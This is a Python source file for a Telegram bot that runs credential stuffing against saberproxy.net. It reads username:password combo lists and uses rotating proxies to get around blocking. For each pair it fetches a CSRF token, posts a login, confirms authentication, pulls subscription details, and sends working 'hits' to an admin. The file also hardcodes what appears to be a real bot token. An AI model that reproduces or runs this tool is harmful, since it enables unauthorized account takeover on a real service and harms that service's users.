import asyncio
import os
import time
import urllib.parse
from collections import deque
from datetime import datetime

import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# ---- config ----
BOT_TOKEN = os.getenv("BOT_TOKEN", "8828944067:AAGioyBDrBdrzbGaOnNPMkieLGDkpPeIfbg")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8712347172"))

BASE = "https://saberproxy.net"
LOGIN_URL = f"{BASE}/api/login"
AUTH_URL = f"{BASE}/api/is-authenticated"
PROXY_URL = f"{BASE}/api/get-proxy"
PLUS_URL = f"{BASE}/api/plus-status"

PROXY_TEST_URL = "http://api.ipify.org?format=json"
PROXY_TEST_TIMEOUT = 6

TIMEOUT = 10
ENRICH = True

PROXY_FAIL_LIMIT = 3
PROXY_FAIL_WINDOW = 600

PROXY_FILE = "proxies.txt"
CHECKED_FILE = "checked.txt"
HITS_FILE = "hits.txt"
REMOVED_FILE = "removed_proxies.txt"

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": BASE,
    "Referer": f"{BASE}/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
}

E = {
    "check": "✅", "cross": "❌", "fire": "🔥", "bolt": "⚡",
    "gem": "💎", "rocket": "🚀", "star": "⭐", "clock": "⏱",
    "chart": "📊", "lock": "🔒", "globe": "🌐", "wave": "👋",
    "crown": "👑", "spark": "✨", "stop": "🛑", "skull": "💀",
    "party": "🎉", "search": "🔍", "save": "💾", "trash": "🗑",
    "list": "📋", "key": "🔑", "cooldown": "❄️", "new": "🆕",
    "shield": "🛡", "target": "🎯",
}

# ---- state ----
lock = asyncio.Lock()
stats = {"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()}
checked_set = set()
running = False
stop_flag = False

# ---- proxy pool ----
proxy_pool = deque()
proxy_recycle = []
proxy_pool_lock = asyncio.Lock()
proxy_fails = {}
proxy_fails_lock = asyncio.Lock()
proxy_removed = set()

# ---- file helpers ----
def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE) as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]

def load_checked():
    if not os.path.exists(CHECKED_FILE):
        return set()
    with open(CHECKED_FILE) as f:
        return {l.strip() for l in f if l.strip()}

def load_removed():
    if not os.path.exists(REMOVED_FILE):
        return set()
    with open(REMOVED_FILE) as f:
        return {l.strip() for l in f if l.strip()}

def save_line(path, line):
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def save_removed(url):
    with open(REMOVED_FILE, "a", encoding="utf-8") as f:
        f.write(url + "\n")

# ---- proxy parsing ----
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "://" in line:
        try:
            u = urllib.parse.urlparse(line)
            if not u.hostname or not u.port:
                return None
            user = urllib.parse.unquote(u.username) if u.username else ""
            pw = urllib.parse.unquote(u.password) if u.password else ""
            auth = f"{user}:{pw}@" if user else ""
            return (u.hostname, u.port, user, pw, f"http://{auth}{u.hostname}:{u.port}")
        except Exception:
            return None
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        try:
            return (host, int(port), "", "", f"http://{host}:{port}")
        except ValueError:
            return None
    if len(parts) == 4:
        host, port, user, pw = parts
        try:
            return (host, int(port), user, pw, f"http://{user}:{pw}@{host}:{port}")
        except ValueError:
            return None
    return None

def format_proxy_line(host, port, user, pw):
    return f"{host}:{port}:{user}:{pw}" if user else f"{host}:{port}"

# ---- proxy pool management ----
def rewrite_proxy_file():
    global proxy_recycle
    with_proxy = list(proxy_pool) + list(proxy_recycle)
    seen = set()
    clean = []
    for url in with_proxy:
        if url in seen or url in proxy_removed:
            continue
        seen.add(url)
        parsed = parse_proxy_line(url)
        if parsed:
            host, port, user, pw, _ = parsed
            clean.append(format_proxy_line(host, port, user, pw))
    with open(PROXY_FILE, "w") as f:
        for line in clean:
            f.write(line + "\n")

async def init_proxy_pool():
    global proxy_pool, proxy_recycle, proxy_removed
    async with proxy_pool_lock:
        proxy_pool.clear()
        proxy_recycle.clear()
        proxy_removed = load_removed()
        for line in load_proxies():
            parsed = parse_proxy_line(line)
            if not parsed:
                continue
            url = parsed[4]
            if url in proxy_removed:
                continue
            proxy_pool.append(url)
        proxy_recycle = list(proxy_pool)

async def next_proxy():
    async with proxy_pool_lock:
        if not proxy_pool:
            for p in proxy_recycle:
                if p not in proxy_removed:
                    proxy_pool.append(p)
        if not proxy_pool:
            return None
        return proxy_pool.popleft()

async def report_proxy_success(url):
    if not url:
        return
    async with proxy_fails_lock:
        proxy_fails.pop(url, None)

async def report_proxy_fail(url, bot=None):
    if not url:
        return False
    removed = False
    async with proxy_fails_lock:
        now = time.time()
        entry = proxy_fails.get(url)
        if entry is None or (now - entry["first_fail_at"]) > PROXY_FAIL_WINDOW:
            entry = {"count": 1, "first_fail_at": now}
            proxy_fails[url] = entry
        else:
            entry["count"] += 1
        if entry["count"] >= PROXY_FAIL_LIMIT:
            proxy_fails.pop(url, None)
            proxy_removed.add(url)
            save_removed(url)
            removed = True

    if removed:
        async with proxy_pool_lock:
            global proxy_pool, proxy_recycle
            proxy_pool = deque(p for p in proxy_pool if p != url)
            proxy_recycle = [p for p in proxy_recycle if p != url]
        try:
            rewrite_proxy_file()
        except Exception:
            pass
        if bot:
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"{E['skull']} <b>PROXY REMOVED</b>\n"
                    f"<code>{url}</code>\n"
                    f"after <b>{PROXY_FAIL_LIMIT}</b> fails",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    return removed

async def test_proxy(parsed, session):
    _, _, _, _, url = parsed
    try:
        async with session.get(PROXY_TEST_URL, proxy=url,
                               timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return bool(data.get("ip"))
    except Exception:
        return False
    return False

async def verify_and_collect(parsed_list, bot, chat_id):
    live, dead = [], 0
    total = len(parsed_list)
    sem = asyncio.Semaphore(200)

    conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        async def probe(p):
            nonlocal dead
            async with sem:
                ok = await test_proxy(p, session)
            if ok:
                host, port, user, pw, _ = p
                live.append(format_proxy_line(host, port, user, pw))
            else:
                dead += 1
        await asyncio.gather(*[asyncio.create_task(probe(p)) for p in parsed_list])

    existing = set()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            existing = {l.strip() for l in f if l.strip()}
    new_ones = [p for p in live if p not in existing]
    with open(PROXY_FILE, "a") as f:
        for p in new_ones:
            f.write(p + "\n")

    msg = (
        f"{E['shield']} <b>PROXY CHECK DONE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['search']} Tested: <code>{total}</code>\n"
        f"{E['check']} Live: <b>{len(live)}</b>\n"
        f"{E['cross']} Dead: <b>{dead}</b>\n"
        f"{E['new']} New: <b>{len(new_ones)}</b>\n"
        f"{E['gem']} Pool: <b>{len(existing) + len(new_ones)}</b>"
    )
    await bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML)

# ---- enrichment ----
async def enrich(session, token):
    extra = ""
    try:
        h = {"X-XSRF-TOKEN": token}
        async with session.get(PROXY_URL, headers=h,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            p = await r.json(content_type=None)
        async with session.get(PLUS_URL, headers=h,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            s = await r.json(content_type=None)
        extra = f" plus={s.get('has_plus')} dur={s.get('duration')} open={p.get('is_open')} srv={p.get('server')}"
    except Exception:
        pass
    return extra

# ---- single check ----
async def check(line, bot, session):
    global stop_flag
    line = line.strip()
    if not line or ":" not in line or stop_flag:
        return
    if line in checked_set:
        return

    user, pw = line.split(":", 1)
    proxy = await next_proxy()
    result_msg = None

    try:
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(headers=HEADERS, cookie_jar=jar,
                                         connector=session.connector,
                                         timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as s:
            # 1. csrf
            try:
                async with s.get(f"{BASE}/sanctum/csrf-cookie", proxy=proxy) as _:
                    pass
            except Exception:
                async with lock:
                    stats["errors"] += 1
                    stats["checked"] += 1
                await report_proxy_fail(proxy, bot)
                return

            # 2. token
            cookies = {c.key: c.value for c in jar}
            xsrf = cookies.get("XSRF-TOKEN")
            token = urllib.parse.unquote(xsrf) if xsrf else ""
            if not token:
                async with lock:
                    stats["errors"] += 1
                    stats["checked"] += 1
                await report_proxy_fail(proxy, bot)
                return

            # 3. login
            login_ok = False
            try:
                async with s.post(LOGIN_URL,
                                  json={"username": user, "password": pw},
                                  headers={"X-XSRF-TOKEN": token},
                                  proxy=proxy, allow_redirects=False) as r:
                    login_ok = r.status in (200, 204, 302)
                    if login_ok and r.status == 200:
                        try:
                            body = await r.json(content_type=None)
                            if isinstance(body, dict) and body.get("success") is False:
                                login_ok = False
                        except Exception:
                            pass
            except Exception:
                async with lock:
                    stats["errors"] += 1
                    stats["checked"] += 1
                await report_proxy_fail(proxy, bot)
                return

            if not login_ok:
                await report_proxy_success(proxy)
                async with lock:
                    stats["fails"] += 1
                    stats["checked"] += 1
                    checked_set.add(line)
                save_line(CHECKED_FILE, line)
                result_msg = f"{E['cross']} FAIL <code>{user}:{pw}</code>"
            else:
                # 4. verify
                auth_ok = False
                try:
                    async with s.get(AUTH_URL, proxy=proxy,
                                     headers={"X-XSRF-TOKEN": token}) as auth:
                        auth_ok = auth.status == 200
                        if auth_ok:
                            try:
                                body = await auth.json(content_type=None)
                                if isinstance(body, dict) and (
                                    body.get("authenticated") is False
                                    or body.get("auth") is False
                                ):
                                    auth_ok = False
                            except Exception:
                                pass
                except Exception:
                    async with lock:
                        stats["errors"] += 1
                        stats["checked"] += 1
                    await report_proxy_fail(proxy, bot)
                    return

                if auth_ok:
                    await report_proxy_success(proxy)
                    extra = await enrich(s, token) if ENRICH else ""
                    async with lock:
                        stats["hits"] += 1
                        stats["checked"] += 1
                        checked_set.add(line)
                    save_line(HITS_FILE, f"{user}:{pw}{extra}")
                    save_line(CHECKED_FILE, line)
                    result_msg = (
                        f"{E['fire']} <b>HIT</b> {E['fire']}\n"
                        f"{E['key']} <code>{user}:{pw}</code>"
                        f"{extra}"
                    )
                else:
                    await report_proxy_success(proxy)
                    async with lock:
                        stats["fails"] += 1
                        stats["checked"] += 1
                        checked_set.add(line)
                    save_line(CHECKED_FILE, line)
                    result_msg = f"{E['cross']} FAIL <code>{user}:{pw}</code>"

    except Exception:
        async with lock:
            stats["errors"] += 1
            stats["checked"] += 1
        await report_proxy_fail(proxy, bot)
        result_msg = f"{E['skull']} ERROR <code>{user}:{pw}</code>"

    if result_msg:
        try:
            await bot.send_message(ADMIN_ID, result_msg, parse_mode=ParseMode.HTML)
        except Exception:
            pass

async def worker(queue, bot, session):
    while not queue.empty() and not stop_flag:
        try:
            line = queue.get_nowait()
        except asyncio.QueueEmpty:
            break
        await check(line, bot, session)
        queue.task_done()

async def reporter(bot):
    while running and not stop_flag:
        await asyncio.sleep(30)
        elapsed = time.time() - stats["start"]
        cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
        pool_size = len(proxy_pool) + len(proxy_recycle)
        msg = (
            f"{E['chart']} <b>STATS</b>\n"
            f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
            f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
            f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
            f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
            f"{E['globe']} Pool: <code>{pool_size}</code>\n"
            f"{E['bolt']} CPM: <b>{cpm:.1f}</b>"
        )
        try:
            await bot.send_message(ADMIN_ID, msg, parse_mode=ParseMode.HTML)
        except Exception:
            pass

# ---- run checker ----
async def run_checker(update, combos):
    global running, stop_flag, checked_set

    if running:
        await update.message.reply_text(
            f"{E['cooldown']} already running. /stop first.",
            parse_mode=ParseMode.HTML
        )
        return

    running = True
    stop_flag = False
    stats.update({"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()})
    checked_set = load_checked()
    await init_proxy_pool()

    lines = list(dict.fromkeys([l.strip() for l in combos if l.strip()]))
    if not lines:
        await update.message.reply_text(
            f"{E['cross']} no valid combos.",
            parse_mode=ParseMode.HTML
        )
        running = False
        return

    bot = update.get_bot()
    pool_size = len(proxy_recycle)

    if pool_size == 0:
        await update.message.reply_text(
            f"{E['cross']} <b>proxy pool is empty.</b>\n"
            f"add proxies with /addproxy first.",
            parse_mode=ParseMode.HTML
        )
        running = False
        return

    start_msg = (
        f"{E['rocket']} <b>CHECK STARTED</b> {E['rocket']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['list']} Combos: <code>{len(lines)}</code>\n"
        f"{E['globe']} Proxy Pool: <code>{pool_size}</code>\n"
        f"{E['save']} Resume Skip: <code>{len(checked_set)}</code>\n"
        f"{E['bolt']} Mode: <b>sequential + strict rotation</b>\n"
        f"{E['skull']} Auto-remove after <b>{PROXY_FAIL_LIMIT}</b> fails\n"
        f"{E['spark']} Every result → admin"
    )
    await update.message.reply_text(start_msg, parse_mode=ParseMode.HTML)

    queue = asyncio.Queue()
    for l in lines:
        queue.put_nowait(l)

    conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False,
                                enable_cleanup_closed=True)
    async with aiohttp.ClientSession(connector=conn) as session:
        asyncio.create_task(reporter(bot))
        await worker(queue, bot, session)

    elapsed = time.time() - stats["start"]
    running = False

    done_msg = (
        f"{E['party']} <b>CHECK DONE</b> {E['party']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['clock']} Duration: <code>{elapsed:.1f}s</code>\n"
        f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
        f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
        f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
        f"{E['skull']} Errors: <code>{stats['errors']}</code>"
    )
    await update.message.reply_text(done_msg, parse_mode=ParseMode.HTML)

    if os.path.exists(HITS_FILE) and stats["hits"] > 0:
        try:
            await bot.send_document(
                ADMIN_ID, open(HITS_FILE, "rb"), filename="hits.txt",
                caption=f"{E['gem']} <b>HITS FILE</b> {E['gem']}",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

# ---- handlers ----
def admin_only(func):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text(
                f"{E['lock']} not for you.",
                parse_mode=ParseMode.HTML
            )
            return
        return await func(update, ctx)
    return wrapper

@admin_only
async def start_cmd(update, ctx):
    msg = (
        f"{E['wave']} <b>Welcome, Kanha</b> {E['crown']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E['rocket']} <b>COMBO CHECKING</b>\n"
        f"{E['check']} /check — reply to combos .txt\n"
        f"{E['check']} /checktext — combos after cmd\n"
        f"{E['chart']} /stats — progress\n"
        f"{E['stop']} /stop — halt run\n\n"
        f"{E['shield']} <b>PROXY MANAGEMENT</b>\n"
        f"{E['check']} /addproxy — reply to proxies .txt\n"
        f"{E['check']} /addproxytext — proxies after cmd\n"
        f"{E['list']} /listproxy — pool overview\n"
        f"{E['trash']} /cleartproxy — wipe pool\n"
        f"{E['skull']} /purgeproxy — purge removed list\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['bolt']} Mode: <b>sequential + strict rotation</b>\n"
        f"{E['skull']} Auto-remove after <b>{PROXY_FAIL_LIMIT}</b> fails\n"
        f"{E['lock']} Hits → admin only"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@admin_only
async def stats_cmd(update, ctx):
    if not running:
        await update.message.reply_text(
            f"{E['cooldown']} not running.",
            parse_mode=ParseMode.HTML
        )
        return
    elapsed = time.time() - stats["start"]
    cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
    pool_size = len(proxy_pool) + len(proxy_recycle)
    msg = (
        f"{E['chart']} <b>STATS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
        f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
        f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
        f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
        f"{E['globe']} Pool: <code>{pool_size}</code>\n"
        f"{E['bolt']} CPM: <b>{cpm:.1f}</b>"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@admin_only
async def stop_cmd(update, ctx):
    global stop_flag
    stop_flag = True
    await update.message.reply_text(
        f"{E['stop']} stopping...",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def check_file(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            f"{E['cross']} reply to a .txt file with combos.",
            parse_mode=ParseMode.HTML
        )
        return
    file = await msg.reply_to_message.document.get_file()
    data = await file.download_as_bytearray()
    combos = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await run_checker(update, combos)

@admin_only
async def check_text(update, ctx):
    text = update.message.text or ""
    parts = text.split("\n", 1)
    if len(parts) < 2:
        await update.message.reply_text(
            f"{E['cross']} send combos on new lines after /checktext",
            parse_mode=ParseMode.HTML
        )
        return
    combos = [l.strip() for l in parts[1].splitlines() if l.strip()]
    await run_checker(update, combos)

async def _process_proxy_lines(update, raw_lines):
    parsed = [p for p in (parse_proxy_line(l) for l in raw_lines) if p]
    if not parsed:
        await update.message.reply_text(
            f"{E['cross']} no valid proxy lines.",
            parse_mode=ParseMode.HTML
        )
        return
    bot = update.get_bot()
    await update.message.reply_text(
        f"{E['search']} testing <code>{len(parsed)}</code> proxies...",
        parse_mode=ParseMode.HTML
    )
    await verify_and_collect(parsed, bot, update.effective_chat.id)

@admin_only
async def addproxy_file(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            f"{E['cross']} reply to a .txt file with proxies.",
            parse_mode=ParseMode.HTML
        )
        return
    file = await msg.reply_to_message.document.get_file()
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await _process_proxy_lines(update, lines)

@admin_only
async def addproxy_text(update, ctx):
    text = update.message.text or ""
    parts = text.split("\n", 1)
    if len(parts) < 2:
        await update.message.reply_text(
            f"{E['cross']} send proxies on new lines after /addproxytext",
            parse_mode=ParseMode.HTML
        )
        return
    await _process_proxy_lines(update, [l.strip() for l in parts[1].splitlines() if l.strip()])

@admin_only
async def listproxy_cmd(update, ctx):
    proxies = load_proxies()
    removed = load_removed()
    if not proxies:
        await update.message.reply_text(
            f"{E['cooldown']} proxy pool is empty.",
            parse_mode=ParseMode.HTML
        )
        return
    preview = "\n".join(proxies[:10])
    more = f"\n... +{len(proxies) - 10} more" if len(proxies) > 10 else ""
    msg = (
        f"{E['globe']} <b>PROXY POOL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['gem']} Live: <b>{len(proxies)}</b>\n"
        f"{E['skull']} Removed: <code>{len(removed)}</code>\n\n"
        f"<code>{preview}</code>{more}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@admin_only
async def cleartproxy_cmd(update, ctx):
    global proxy_pool, proxy_recycle
    if os.path.exists(PROXY_FILE):
        os.remove(PROXY_FILE)
    async with proxy_pool_lock:
        proxy_pool.clear()
        proxy_recycle.clear()
    await update.message.reply_text(
        f"{E['trash']} proxy pool wiped.",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def purgeproxy_cmd(update, ctx):
    if os.path.exists(REMOVED_FILE):
        os.remove(REMOVED_FILE)
    proxy_removed.clear()
    await update.message.reply_text(
        f"{E['skull']} removed-proxy list purged.\n"
        f"all proxies will be re-loaded on next check.",
        parse_mode=ParseMode.HTML
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("check", check_file))
    app.add_handler(CommandHandler("checktext", check_text))
    app.add_handler(CommandHandler("addproxy", addproxy_file))
    app.add_handler(CommandHandler("addproxytext", addproxy_text))
    app.add_handler(CommandHandler("listproxy", listproxy_cmd))
    app.add_handler(CommandHandler("cleartproxy", cleartproxy_cmd))
    app.add_handler(CommandHandler("purgeproxy", purgeproxy_cmd))
    print("bot up. admin=", ADMIN_ID)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
